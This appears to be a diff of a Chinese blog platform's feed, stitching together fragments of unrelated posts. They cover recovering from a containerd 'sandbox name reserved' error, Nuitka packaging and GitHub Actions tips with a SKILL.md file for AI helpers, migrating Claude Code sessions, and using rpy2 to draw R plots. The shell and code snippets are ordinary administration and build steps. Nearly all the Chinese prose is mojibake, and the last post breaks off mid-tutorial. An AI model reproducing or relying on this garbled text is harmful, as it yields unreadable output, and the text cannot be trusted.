-<h2 id="2éå¯åå®¹å¨åç§°è¢«å ç¨å®¹å¨æ æ³åå»º">2.éå¯åå®¹å¨åç§°è¢«å ç¨ï¼å®¹å¨æ æ³åå»º</h2>
-<h3 id="21é®é¢ç°è±¡">2.1.é®é¢ç°è±¡</h3>
-<blockquote>
-<p>è§¦ååå ä¸é®é¢ 1 åæºï¼æ¶é´è·³åå¯¼è´ containerd æ°æ®åå¥ä¸å®æ´ï¼ï¼<strong>æ ¹æ²»åæ ·ç¨ <a href="#13%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F" rel="noopener nofollow">1.3</a> çæ¹æ¡</strong>ãæ¬èè®²çæ¯éå¯åå·²ç»åºç°è¯¥çç¶æ¶ï¼å¦ä½æå¨æ¢å¤ã</p>
-</blockquote>
-<p>æ­¤é®é¢ä¸è¬ç±ä¸¤ç§æåµå¯¼è´ï¼</p>
-<ol>
-<li><a href="https://github.com/containerd/containerd/issues/10848" target="_blank" rel="noopener nofollow">éåå­åå¥</a>ï¼containerd åå»ºå®¹å¨æ¶ä¼åä¸¤æ¡è®°å½ï¼åç§° + è¯¦æï¼ï¼å¦åºç° æ­çµ/panic/æ¶é´è·³å ç­æåµåªåä¸æ¡å°±ä¼æ®çï¼</li>
-<li>æ¶é´è·³åï¼æ¬æ¬¡æ ¹å ï¼ã</li>
-</ol>
-<pre><code class="language-bash"># kubectl get pods -n kube-system -o wide | grep demo-1
-NAME                              READY   STATUS     RESTARTS  AGE    IP        NODE
-coredns-dbbb9ff68-pzr4j           1/1     Running    4         5h8m   x.x.x.x   demo-1
-etcd-demo-1                       0/1     Unknown    8         20m    x.x.x.x   demo-1
-kube-apiserver-demo-1             0/1     Unknown    32        20m    x.x.x.x   demo-1
-kube-controller-manager-demo-1    0/1     Unknown    20        20m    x.x.x.x   demo-1
-kube-proxy-jgx42                  1/1     Running    0         34m    x.x.x.x   demo-1
-kube-scheduler-demo-1             0/1     Unknown    19        20m    x.x.x.x   demo-1
-node-local-dns-vgjlf              1/1     Running    0         28m    x.x.x.x   demo-1
-</code></pre>
-<h3 id="22ææ¥è¿ç¨">2.2.ææ¥è¿ç¨</h3>
-<h4 id="221æ¥åºå±å®¹å¨ä¸æ¥å¿">2.2.1.æ¥åºå±å®¹å¨ä¸æ¥å¿</h4>
-<p>å®¹å¨å·²åå»ºä½å¤äº Exitedï¼ä¸æ¥å¿æä»¶ä¸å­å¨ï¼å®¹å¨å¹¶æªçæ­£èµ·æ¥ï¼ï¼</p>
-<pre><code class="language-bash"># crictl ps -a | grep -i 'etcd'
-CONTAINER       IMAGE           CREATED                  STATE    NAME   ATTEMPT   POD ID          POD
-c93ac13a41b67   2e96e5913fc06   Less than a second ago   Exited   etcd   8         f2fc82e9a4d98   etcd-demo-1
-
-## æ¥å¿æä»¶ä¸å­å¨
-# crictl logs 624bf43aff2db
-FATA[0000] failed to try resolving symlinks in path "/var/log/pods/kube-system_etcd-demo-1_c93ac13a41b67d89d5dbbfbc90cf9c8f/etcd/8.log":
-lstat /var/log/pods/kube-system_etcd-demo-1_c93ac13a41b67d89d5dbbfbc90cf9c8f/etcd/8.log: no such file or directory
-</code></pre>
-<h4 id="222æ¥-kubelet-æ¥å¿">2.2.2.æ¥ kubelet æ¥å¿</h4>
-<p>å®¹å¨ç± kubelet æèµ·ï¼ç kubelet çæ¥éãä»¥ä¸æ¥å¿é½å¨è¯´åä¸ä»¶äºï¼kubelet æ³åå»º <code>etcd-demo-1</code>ï¼ä½è¿ä¸ªåå­å¨ containerd éå·²è¢«å ç¨ï¼reservedï¼ï¼</p>
-<pre><code class="language-bash"># journalctl -u kubelet --since "3 min ago" --no-pager | grep -i 'etcd'
-Jun 18 23:02:36 demo-1 kubelet[23429]: E0618 23:02:36.675072 ... "RunPodSandbox from runtime service failed" err="rpc error: code = Unknown desc = failed to reserve sandbox name \"etcd-demo-1_kube-system_df1fae7c70ff1a1dfc6127a8f7bf67a2_6\": name ... is reserved for \"7cc9d6627964...\""
-Jun 18 23:02:36 demo-1 kubelet[23429]: E0618 23:02:36.675212 ... "Failed to create sandbox for pod" err="... failed to reserve sandbox name \"etcd-demo-1_kube-system_..._6\": name ... is reserved for \"7cc9d6627964...\"" pod="kube-system/etcd-demo-1"
-Jun 18 23:02:36 demo-1 kubelet[23429]: E0618 23:02:36.675273 ... "CreatePodSandbox for pod failed" err="... failed to reserve sandbox name \"etcd-demo-1_kube-system_..._6\": name ... is reserved for \"7cc9d6627964...\"" pod="kube-system/etcd-demo-1"
-Jun 18 23:02:36 demo-1 kubelet[23429]: E0618 23:02:36.675410 ... "Error syncing pod, skipping" err="failed to \"CreatePodSandbox\" for \"etcd-demo-1_kube-system(...)\" with CreatePodSandboxError: ... name ... is reserved for \"7cc9d6627964...\"" pod="kube-system/etcd-demo-1"
-</code></pre>
-<h3 id="23è§£å³æ¹å¼">2.3.è§£å³æ¹å¼</h3>
-<blockquote>
-<p>è¡¥åï¼containerd ç¤¾åºå·²æå¯¹åº <a href="https://github.com/containerd/containerd/issues/10848" target="_blank" rel="noopener nofollow">issue #10848</a>ï¼2.2.x / 2.3.x å·²ä¿®å¤ï¼è§ <a href="https://github.com/containerd/containerd/pull/11576" target="_blank" rel="noopener nofollow">PR #11576</a>ï¼ï¼åçº§åå¯é¿åå¤åã</p>
-</blockquote>
-<p>æå kubelet æå¡åï¼æå¨æ¸çè¢«å ç¨çå®¹å¨ï¼åéå¯ containerd å³å¯ï¼</p>
-<pre><code class="language-bash">## å kubeletï¼å¦åå®ä¼åå¤å°è¯åå»º
-# systemctl stop kubelet
-
-## æ¾å°è¢«å ç¨ç sandboxï¼æåå­æ¥éåï¼
-# crictl pods                     ## ååºææ sandbox
-# crictl pods -q --name &lt;name&gt;    ## æ¿å°å¯¹åº ID
-
-## å é¤æ®ç sandbox
-# crictl stopp $ID
-# crictl rmp -f $ID
-
-# systemctl restart containerd
-# systemctl start kubelet
-</code></pre>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0.0020833333333333333" data-date-updated="2026-06-20 21:17">2026-06-20 21:14</span>&nbsp;
-<a href="https://www.cnblogs.com/manuscript">æä¹è¿å¨åä»£ç </a>&nbsp;
-éè¯»(<span id="post_view_count">9</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20671004);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fmanuscript%2Fp%2F20671004&amp;targetId=20671004&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
     <title><![CDATA[ GDBè°è¯ç®ä»ä¸è°è¯éç½® ]]></title>
     <link>https://www.cnblogs.com/ttkwzyttk/p/20670511</link>
     <guid>2aafdef43803bc737471a487794af8b3</guid>
@@ -1329,183 +893,11 @@ GPIO_Init( GPIOA, &amp;GPIO_InitStructure );
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-06-20 14:06">2026-06-20 14:06</span>&nbsp;
 <a href="https://www.cnblogs.com/ifndef">ifndef</a>&nbsp;
-éè¯»(<span id="post_view_count">0</span>)&nbsp;
+éè¯»(<span id="post_view_count">38</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20667197);return false;">æ¶è</a>&nbsp;
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fifndef%2Fp%2F20667197&amp;targetId=20667197&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ [ææ¯å¤ç] Windows Python æåå®æï¼Nuitka ç¯å¢è¸©åæ»ç»ä¸ CI èªå¨åæå»ºå¨æå ]]></title>
-    <link>https://www.cnblogs.com/cup11/p/20314545</link>
-    <guid>bc03236e8783ad2b53512b458088ec73</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/cup11/p/20314545" title="åå¸äº 2026-06-20 13:14">
-    <span role="heading" aria-level="2">[ææ¯å¤ç] Windows Python æåå®æï¼Nuitka ç¯å¢è¸©åæ»ç»ä¸ CI èªå¨åæå»ºå¨æå</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                    <div id="cnblogs_post_description" style="display: none">
-        
-        Python æåæ EXE å¹¶éæäºï¼Nuitka è½ç¶æ§è½åè¶ï¼ä½ä¹éèçä¸å°âæé·âãæ¬æåºäº Meta Assistant çå¼åå®è·µï¼è§£å³äº Nuitka `sys.executable` æªè½æ£æµæ¯å¦å·²æåãCI æå»ºå¤±è´¥ `FATAL: Nuitka does not work in '--mode=standalone' or '--mode=onefile' on Windows without dependency walker` ä»¥åâæ¬å°è¿è¡æ­£å¸¸ï¼ä¸è½½è¿ç¨åå¯å¨å­è¿ç¨å°±å¤±è´¥âç `TCL_LIBRARY` ç¯å¢åéæ³¨å¥ç­ãææ«éå¸¦ä¸ä»½å¯ç´æ¥å¤ç¨ç AI è¾å©å¼å SKILL å¤å¿å½ã
-    </div>
-<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<blockquote>
-<p>å¦ <a href="https://www.cnblogs.com/cup11/p/20287335" target="_blank">https://www.cnblogs.com/cup11/p/20287335</a> æè¿°ï¼æ¥ä¸æ¥æè¦æ°åä¸ç³»åææ¯å¤çã</p>
-</blockquote>
-<h2 id="ç¯å¢æ£æµæ¯å¦ä¾é -exe-è¿è¡">ç¯å¢æ£æµï¼æ¯å¦ä¾é  exe è¿è¡ï¼</h2>
-<p>æäºåè½ï¼å¦å¼æºèªå¯å¨ï¼å¯è½éè¦éå¶å¨ä¾é  exe è¿è¡çæåµï¼ç¸ä¿¡å¾å¤å¼åèç¬¬ä¸ååºå°±ä¿¡æææ¥ <code>sys.executable</code> ä¾¦æµï¼</p>
-<pre><code class="language-python">isExe = sys.executable.lower() not in ('python.exe', 'pythonw.exe') # Wrong!
-</code></pre>
-<p>ä½æ¯ï¼Nuitka æå»ºä¹åç <code>sys.executable</code> å¾å¯è½ç¨³å®æå <code>python</code> è§£éå¨çè·¯å¾ï¼è¿ä¸ªæ¹æ³æ¯<strong>ä¸å¯é ç</strong>ï¼æ­£ç¡®è§£æ³ï¼Nuitka æå»ºå®æ¯åä¼æ³¨å¥åé <code>__compiled__</code> ä¸º <code>True</code>ã</p>
-<pre><code class="language-python">isExe = globals().get("__compiled__", False) # Correct
-</code></pre>
-<p><code>Pyinstaller</code> æåæ¯éè¿å¨ <code>sys</code> ä¸è®¾ç½® <code>frozen = True</code>ï¼æä»¥å¦æä½ æ³è¦æ´å¼ºçå¼å®¹æ§</p>
-<pre><code class="language-python"># Ultimate Solution
-
-import sys
-
-def isExe() -&gt; bool:
-    isNuitkaExe = globals().get("__compiled__", False)
-    isPyInstallerExe = getattr(sys, "frozen", False)
-    return isNuitkaExe or isPyInstallerExe
-</code></pre>
-<h2 id="ci-éç½®">CI éç½®</h2>
-<p>å¦æè¦ä½¿ç¨ Github Actions æå»º Nuitka åºç¨ï¼ä»ä»å°æ¬å°å½ä»¤æ¬ä¸å»å¾å¯è½ä¼æ¥éã</p>
-<p><strong>éè¦æ·»å  <code>--assume-yes-for-downloads</code> å½ä»¤åæ°</strong>ï¼<code>--standalone</code> æ¨¡å¼å¨ Windows ä¸éè¦ Dependency Walkerãæ¬å°å¯è½å·²å¨äº¤äºç¯å¢éç½®å®æ¯ï¼è CI éäº¤äºç¯å¢ä¸é»è®¤é "no" å¯¼è´ FATALã</p>
-<h2 id="ç¯å¢åéæ³¨å¥">ç¯å¢åéæ³¨å¥</h2>
-<p>Meta Assistant æ¯ä¸æ¬¾æçå·¥å·ï¼ç¨äºå¾å½¢åå°ç¨å­è¿ç¨å¯å¨ç¹å®ç®å½ä¸ç Python èæ¬èä¸éè¦æ¯æ¬¡è¿å¥å½ä»¤è¡è¾å¥ï¼å¶ä½¿ç¨äº Tkinter çæä»¶ç®å½éæ©å¨åè½ã</p>
-<p>ç¶èï¼è¯¡å¼çäºæåçäºï¼</p>
-<ul>
-<li><strong>ç¯å¢</strong>ï¼æ¬å° Python 3.11ï¼Github CI Python 3.12</li>
-<li><strong>æ¬å°ç´æ¥ç¨ python è¿è¡èæ¬</strong>ï¼è½å¤æåå¯å¨ææèæ¬</li>
-<li><strong>æ¬å° Nuitka æå»º</strong>ï¼è½å¤æåå¯å¨ææèæ¬</li>
-<li><strong>è¿è¡ä» CI ä¸è½½çæåäº§ç©</strong>ï¼ææ<strong>è°ç¨å­è¿ç¨ Tkinter çåè½ååå¤±æ</strong>ï¼</li>
-</ul>
-<p>ç»è¿æ°å°æ¶çææ¥ï¼æç»ç¡®è®¤ï¼</p>
-<p>Nuitka exe æ³¨å¥äºç¯å¢åéï¼é <code>Popen</code> æ³¨å¥å°ä¸æ¸¸å­èæ¬ï¼ä¸å¶ä»èæ¬çç¯å¢ä¸ä¸è´ï¼é æå´©æºï¼</p>
-<p><strong>ç½ªé­ç¥¸é¦</strong>ï¼</p>
-<pre><code>TCL_LIBRARY = E:\META-A~1\tclï¼Tcl 8.6.12ï¼
-TK_LIBRARY = E:\META-A~1\tkï¼Tk 8.6.12ï¼
-</code></pre>
-<p>è¿ä¸ªæäºåè¯æä»¬ï¼Nuitka æå»ºåå¦æè®¾è®¡âè¿è¡å­è¿ç¨âï¼å¡å¿åæ£æ¥èªå¨æ³¨å¥çç¯å¢åéï¼åæ¶å»é¤ï¼é²æ­¢å´©æºï¼</p>
-<p>å¯¹äºæ¥å¥äº Tkinter çå·¥å·ï¼æ¨èå å¥ä¸é¢çå½æ°ï¼</p>
-<pre><code class="language-python">import os
-import subprocess
-
-def get_clean_env():
-    env = os.environ.copy()
-    # ç§»é¤ Nuitka å¼ºå¶æ³¨å¥çç¯å¢åéï¼è®©å­è¿ç¨åå½ç³»ç»é»è®¤ Tcl/Tk æ¥æ¾é»è¾
-    env.pop("TCL_LIBRARY", None)
-    env.pop("TK_LIBRARY", None)
-    return env
-
-subprocess.Popen(["python", "sub_script.py"], env=get_clean_env())
-</code></pre>
-<h2 id="åè®°skillmd">åè®°ï¼<code>SKILL.md</code></h2>
-<p>æä¸ç´åææå¨å¤å¶ SKILL åç» AIï¼è¿ä¸ª SKILL ææ¡£æµç¼©äºåç§ä¸è·¯ä¸ AI ç¯è¿çéè¯¯ï¼ä¾è¯»èæ¾å°æ¬å°å¤ç¨ï¼èçä¸ä¸ªå°æ¶ã</p>
-<pre><code class="language-markdown">---
-name: nuitka-build
-description: Please read this if you are configuring GitHub Actions for Python project builds.
----
-
-## Dependency Walker ä¸è½½è¢«æ
-
-`--standalone` æ¨¡å¼å¨ Windows ä¸éè¦ Dependency Walkerï¼CI éäº¤äºç¯å¢ä¸é»è®¤é "no" å¯¼è´ FATALã
-
-**å¿é¡»æ·»å  `--assume-yes-for-downloads` æå¨ç¯å¢ä¸­è®¾ç½® `NUITKA_ASSUME_YES_FOR_DOWNLOADS=1`ã**
-
-## Release 403 éè¯¯
-
-`softprops/action-gh-release` åå»º Release æ¶ 403ï¼åå æ¯é»è®¤ `GITHUB_TOKEN` åªæ `contents: read`ã
-
-**ä¿®å¤ï¼å¨ release workflow é¡¶é¨æ·»å  `permissions: contents: write`ã**
-
-## Windows runner æ²¡æ zip å½ä»¤
-
-`windows-latest` ä¸æ²¡æ Unix `zip` å½ä»¤ï¼ç¨ `zip -r` ä¼æ¥éã
-
-**ä¿®å¤ï¼ä½¿ç¨ PowerShell ç `Compress-Archive -Path &lt;source&gt; -DestinationPath &lt;output.zip&gt;`ã**
-
-## sys.executable å¨æ°ç Nuitka ä¸­ä¸å¯é 
-
-ç¼è¯å `sys.executable` å¯è½æå Python è§£éå¨èé exe è·¯å¾ï¼`Path(sys.executable).name` æ£æµå¤±æã
-
-**ä¿®å¤**ï¼æ¹ç¨ Nuitka ç¼è¯æ¶æ³¨å¥ç `__compiled__`ï¼
-
-```python
-if not globals().get("__compiled__", False):
-    return  # å¼åæ¨¡å¼ï¼è·³è¿ exe ä¸å±é»è¾
-```
-
-## `--windows-installer` ä¸å­å¨
-
-Nuitka**æ²¡æ** `--windows-installer` è¿ä¸ªéé¡¹ãéè¦ç¨å®è£åæ¶ï¼åä¸¤æ­¥ï¼
-
-1. Nuitka ç¼è¯ä¸º `--standalone`ï¼äº§ç `.dist` ç®å½ï¼
-2. ç¨ Inno Setupï¼`iscc`ï¼éå `.iss` èæ¬æå
-
-```yaml
-- run: python -m nuitka --standalone ... --output-dir=dist ...
-- run: iscc /DAPP_VERSION="${{ github.ref_name }}" installer.iss
-```
-
-## ISS èæ¬çæ¬å·ç¨é¢å¤çå¨åé
-
-`GetEnv()` åçæ¯ç³»ç»ç¯å¢åéï¼**ä¸æ¯** `/D` ä¼ å¥çé¢å¤çå¨åéãæ­£ç¡®ç¨æ³ï¼
-
-```iss
-; â GetEnv è¯»ä¸å° /D åæ°
-AppVersion={#APP_VERSION}  ; â é¢å¤çå¨åé
-```
-
-Workflow ä¼ å¼ï¼
-
-```yaml
-- run: iscc /DAPP_VERSION="${{ github.ref_name }}" installer.iss
-```
-
-## ISS AppId è¦ç¨ç UUID
-
-AppId ä¸è½éæç¼ï¼æ¯ä¸ªé¡¹ç®å¿é¡»ç¨ä»¥ä¸å½ä»¤çææ°çå¯ä¸ IDï¼
-
-```powershell
-python -c "import uuid; print(str(uuid.uuid4()).upper())"
-```
-
-çæååºå®åæ­»å° `.iss`ã
-
-## `--windows-icon-from-ico`
-
-Nuitka çå®éé¡¹ï¼ç» exe è®¾å¾æ ï¼æ¯æ `.ico` æ `.png` æ ¼å¼ï¼Nuitka èªå¨è½¬æ¢ï¼
-
-```yaml
---windows-icon-from-ico=assistant.ico
-```
-</code></pre>
-
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-06-20 13:14">2026-06-20 13:14</span>&nbsp;
-<a href="https://www.cnblogs.com/cup11">cup11</a>&nbsp;
-éè¯»(<span id="post_view_count">20</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20314545);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fcup11%2Fp%2F20314545&amp;targetId=20314545&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
 </div>
          ]]>
     </description>
@@ -1725,7 +1117,7 @@ git -c user.name="newbe" -c user.email="newbe@newbe.pro" commit \
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-06-20 13:00">2026-06-20 13:00</span>&nbsp;
 <a href="https://www.cnblogs.com/newbe36524">Newbe36524</a>&nbsp;
-éè¯»(<span id="post_view_count">0</span>)&nbsp;
+éè¯»(<span id="post_view_count">26</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20666681);return false;">æ¶è</a>&nbsp;
@@ -1924,7 +1316,7 @@ cp -r /path/to/claude-migration/tasks/SESSION_ID/* \
 <pre><code class="language-bash">cd "C:\Users\B\Desktop\æææ¯æ°æ®é"
 claude
 </code></pre>
-<p>è¿å¥åè¾å¥ <code>/context</code>ï¼å¦ææ¾ç¤ºç token ç¨éä¸æ§çµèä¸è´ï¼å¦ 21%ï¼ï¼æ­åè¿ç§»æåï¼æåä¸ç®­å¤´åºè¯¥è½çå°åå²å¯¹è¯è®°å½ã</p>
+<p>è¿å¥åè¾å¥ <code>/context</code>ï¼å¦ææ¾ç¤ºç token ç¨éä¸æ§çµèä¸è´ï¼æ­åè¿ç§»æåï¼æåä¸ç®­å¤´åºè¯¥è½çå°åå²å¯¹è¯è®°å½ã</p>
 <h2 id="äºéªè¯è¦ç¹ä¸æéæé¤">äºãéªè¯è¦ç¹ä¸æéæé¤</h2>
 <h3 id="å¸¸è§é®é¢">å¸¸è§é®é¢</h3>
 <p><strong>Qï¼å¯å¨åçä¸å°å¯¹è¯åå²ï¼ä½ token ç¨éæ­£å¸¸ï¼</strong></p>
@@ -1958,10 +1350,10 @@ claude
 
             </div>
             <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0.002777777777777778" data-date-updated="2026-06-20 13:00">2026-06-20 12:56</span>&nbsp;
+<span id="post-date" data-last-update-days="0.44166666666666665" data-date-updated="2026-06-20 23:32">2026-06-20 12:56</span>&nbsp;
 <a href="https://www.cnblogs.com/onlybwj">onlyèµ</a>&nbsp;
-éè¯»(<span id="post_view_count">3</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+éè¯»(<span id="post_view_count">61</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20666674);return false;">æ¶è</a>&nbsp;
 <a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fonlybwj%2Fp%2F20666674&amp;targetId=20666674&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
@@ -2254,14 +1646,253 @@ Terminatedï¼ç»æï¼ä¸å¯æ¢å¤ï¼
     </description>
     </item>
 <item>
-    <title><![CDATA[ 3minææä¸ä¸ªå¸®å©ææ¡£ï¼å¾åçå§ï¼ ]]></title>
-    <link>https://www.cnblogs.com/JulianHuang/p/20666309</link>
-    <guid>c4dca0834acf8509a2590d9a27cbe493</guid>
+    <title><![CDATA[ Pythonä¸­ç»å¶Rçç§ç çº§å¯è§åå¾ ]]></title>
+    <link>https://www.cnblogs.com/hongbao/p/20671555</link>
+    <guid>87318dbbc0e0a33f927d5b432de997a6</guid>
     <description>
     <![CDATA[ 
             <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/JulianHuang/p/20666309" title="åå¸äº 2026-06-20 12:05">
-    <span role="heading" aria-level="2">3minææä¸ä¸ªå¸®å©ææ¡£ï¼å¾åçå§ï¼</span>
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/hongbao/p/20671555" title="åå¸äº 2026-06-20 23:21">
+    <span role="heading" aria-level="2">Pythonä¸­ç»å¶Rçç§ç çº§å¯è§åå¾</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<h2>ä¸ãéè¦çæ¡¥æ¥Pythonåº</h2>
+<pre>rpy2# pip install rpy2   æçRè¯­è¨çæ¬ä¸º 4.1.3 ï¼éè¦rpy2 3.5.Xçæ¬å»å¯¹åº</pre>
+<h2>äºãç¡®ä¿Rç¯å¢</h2>
+<pre><em>ç¡®ä¿ä½ çµèå·²å®è£ Rï¼å¹¶å¨ R éè£å¥½ç¸å³åï¼# install.packages(c("ggplot2", "ggstatsplot", "patchwork","</em>ggpmisc"))</pre>
+<p><span style="color: rgba(255, 0, 0, 1)"><strong>æ³¨æï¼è¿éå¯è½éå°å ä¸ªé®é¢ï¼</strong></span></p>
+<h3><span style="color: rgba(0, 0, 0, 1)">1.rpy2åpythonåRççæ¬å¼å®¹é®é¢</span></h3>
+<p><span style="color: rgba(0, 0, 0, 1)"><strong>å¯è½ææ¥éï¼</strong>ffi.error: symbol 'R_getVar' not found in library 'E:\R\Rlangrage\R-4.1.3\bin\x64\R.dll': error 0x7f</span></p>
+<p><span style="color: rgba(0, 0, 0, 1)">æ­¤æ¶éè¦è°æ´rpy2çæ¬ä½¿å¾ä¸æ¹åæ¶éé</span></p>
+<span style="color: rgba(0, 0, 0, 1)">å¦ï¼Python 3.9 + R 4.1.3 å¯ä»¥å è½½ rpy2&nbsp; 3.5.x&nbsp; çæ¬</span>
+<p>&nbsp;</p>
+<h3><span style="color: rgba(0, 0, 0, 1)">2.Rä¸­æ²¡æç¸å³çåº/å</span></h3>
+<p><span style="color: rgba(0, 0, 0, 1)"><strong>å¯è½ææ¥éï¼</strong>rpy2.robjects.packages.PackageNotInstalledError: The R package "ggplot2" is not installed.</span></p>
+<p><span style="color: rgba(0, 0, 0, 1)">æ¹æ³ï¼æå®çæ¬ä¸è½½</span></p>
+<p>&nbsp;</p>
+<div class="cnblogs_code">
+<pre>install.packages(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">https://cran.r-project.org/src/contrib/Archive/ggplot2/ggplot2_3.4.2.tar.gz</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
+                 repos </span>= NULL, type = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">source</span><span style="color: rgba(128, 0, 0, 1)">"</span>)</pre>
+</div>
+<p>&nbsp;</p>
+<p><strong>å¯è½ææ¥éï¼</strong>rpy2.rinterface_lib.embedded.RRuntimeError: Error in library(ggstatsplot) : there is no package called 'ggstatsplot'</p>
+<p>æ¹æ³ï¼å®è£å¼å®¹ R 4.1.3 çæ§ç <code>ggstatsplot</code></p>
+<p>ä¸è¬æ¹æ³è¾ä¸ºå°é¾ï¼è¿ééç¨å±å¹å¿«ç§ï¼ç©¿è¶å4.1.3éç¨çå½å¹´è¿è¡ä¸è½½ï¼</p>
+<p>â æå¼ R 4.1.3 æ§å¶å°<span>ï¼åè®¾ç½®éåä¸º MRAN å¿«ç§ï¼è¿ééæ© 2022-08-15ï¼R 4.1.3 ç¨³å®æï¼ï¼</span></p>
+<div class="cnblogs_code">
+<pre>options(repos = c(CRAN = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">https://cran.microsoft.com/snapshot/2022-08-15/</span><span style="color: rgba(128, 0, 0, 1)">"</span>))</pre>
+</div>
+<p>â¡<span>ç´æ¥å®è£<span style="font-family: &quot;times new roman&quot;, times; color: rgba(0, 0, 0, 1)"> <code>ggstatsplotã</code></span></span><span style="font-family: &quot;times new roman&quot;, times; color: rgba(0, 0, 0, 1)">ggpmisc</span></p>
+<p><span><code></code><span>ï¼å®ä¼èªå¨ä»è¯¥å¿«ç§æåå¼å®¹çæ¬çä¾èµåï¼<code>correlation</code><span>, <code>datawizard</code><span>, <code>patchwork</code><span> ç­å¨é¨æ¯å½æ¶çèçæ¬ï¼</span></span></span></span></span></p>
+<div class="cnblogs_code">
+<pre>install.packages(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ggstatsplot</span><span style="color: rgba(128, 0, 0, 1)">"</span>)</pre>
+</div>
+<p>â¢å¦ææç¤ºéè¦ Rtools ç¼è¯ï¼Windows ä¸æå°åçï¼å¿«ç§æä¾äºè¿å¶ï¼ï¼å°±åè£ <a href="https://cran.r-project.org/bin/windows/Rtools/rtools40.html" rel="noopener nofollow" target="_blank">Rtools40</a>ï¼å®è£æ¶å¾éâAdd Rtools to system PATHâã</p>
+<p>å¤ç¨ï¼å¦æ MRAN å¿«ç§è¿æ¥å¤±è´¥ï¼å¯æ¹ç¨å¶å®åå²éåï¼ä¾å¦ï¼</p>
+<div class="cnblogs_code">
+<pre>options(repos = c(CRAN = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">https://packagemanager.rstudio.com/cran/__linux__/focal/2022-08-15</span><span style="color: rgba(128, 0, 0, 1)">"</span>))</pre>
+</div>
+<div class="cnblogs_code">
+<pre>options(repos = c(CRAN = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">https://packagemanager.posit.co/cran/2022-08-15</span><span style="color: rgba(128, 0, 0, 1)">"</span>))</pre>
+</div>
+<p><strong>å½æ¥éï¼</strong>Warning: unable to access index for repository https://cran.microsoft.com/snapshot/2022-08-15/src/contrib: æ æ³æå¼URL'https://cran.microsoft.com/snapshot/2022-08-15/src/contrib/PACKAGES'å³è¡¨ç¤ºè¯¥å¿«ç§æç©¿è¶è·¯çº¿å¤±æéè¦æ´æ¢å¿«ç§è·¯å¾</p>
+<h3>3.è¯­è¨ç¯å¢éè¯¯</h3>
+<p>å¯è½ææ¥éï¼UnicodeDecodeError: 'utf-8' codec can't decode byte 0xb2 in position 32: invalid start byte</p>
+<p>æ¹æ³ï¼å¨ Python ä¸­å¼ºå¶ R ä½¿ç¨è±ææ¶æ¯å£°æï¼</p>
+<p class="ds-markdown-paragraph"><span>å¨å¯¼å¥ <code>rpy2</code><span> åãä»»ä½ç»å¾åï¼å ä¸è¡ï¼</span></span></p>
+<div class="cnblogs_code">
+<pre>ro.r(<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">Sys.setenv(LANGUAGE="en")</span><span style="color: rgba(128, 0, 0, 1)">'</span>)</pre>
+</div>
+<h2>ä¸ãç»å¾æµè¯</h2>
+<h3><span>ä¾ 1ï¼<code>ggstatsplot</code><span> ââ ä¸è¡ä»£ç å¸¦ç»è®¡æ£éªçç®±çº¿å¾</span></span></h3>
